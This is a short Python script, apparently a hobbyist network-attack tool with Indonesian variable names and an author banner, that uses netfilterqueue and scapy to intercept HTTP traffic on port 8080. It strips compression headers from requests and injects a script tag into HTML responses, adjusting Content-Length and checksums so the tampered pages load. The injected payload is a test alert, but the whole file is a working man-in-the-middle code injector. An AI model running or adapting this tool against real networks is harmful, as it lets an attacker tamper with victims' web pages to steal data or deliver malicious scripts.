#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re


def load_nuz(kardus, load):
    kardus[scapy.Raw].load = load
    del kardus[scapy.IP].len
    del kardus[scapy.IP].chksum
    del kardus[scapy.TCP].chksum
    return kardus
def proseskardus_nuz(kardus):
    kardusscapy = scapy.IP(kardus.get_payload())
    if kardusscapy.haslayer(scapy.Raw):
        try:
            load = kardusscapy[scapy.Raw].load.decode()
            if kardusscapy[scapy.TCP].dport == 8080:
                print("minta HTTP")

                penutupan = '''
                     dibuat dengan niat oleh 
                      ______   _ _   _ _   _ _______________
                     |__  / | | | \ | | | | |__  /__  /__  /
                       / /| | | |  \| | | | | / /  / /  / / 
                      / /_| |_| | |\  | |_| |/ /_ / /_ / /_ 
                     /____|\___/|_| \_|\___//____/____/____|
                 
                     https://steamcommunity.com/id/zunuzzz/
                     
                     =========GUNAKAN DENGAN BIJAK=========
                     '''

                print(penutupan)

                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                load = load.replace("HTTP/1.1", "HTTP/1.0")

            elif kardusscapy[scapy.TCP].sport == 8080:
                print("respon HTTP")
                kodeinjek = "<script>alert('test');</script>"
                load = load.replace("</body>", kodeinjek + "</body>")
                carikontenlen = re.search("(?:Content-Length:\s)(\d*)", load)
                if carikontenlen and "text/html" in load:

                    kontenlen = carikontenlen.group(1)
                    kontenlenbaru = int(kontenlen) + len(kodeinjek)
                    load = load.replace(kontenlen, str(kontenlenbaru))
                    print(kontenlen)
            if load != kardusscapy[scapy.Raw].load:
                    paketbaru = load_nuz(kardusscapy, load)
                    kardus.set_payload(bytes(paketbaru))

        except UnicodeDecodeError:
            pass
        
    kardus.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, proseskardus_nuz)
queue.run()


